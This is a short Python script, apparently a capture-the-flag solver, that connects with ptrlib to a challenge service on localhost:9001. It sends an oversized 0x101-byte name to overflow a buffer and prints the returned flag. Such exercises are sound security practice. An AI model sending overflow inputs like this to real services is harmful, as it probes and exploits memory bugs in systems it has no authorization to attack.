from ptrlib import *
import os

HOST = os.getenv("HOST", 'localhost')
PORT = int(os.getenv("PORT", 9001))

sock = Socket(HOST, PORT)
sock.sendlineafter("Name: ", "A"*0x101)
print(sock.recvuntil(b"}"))
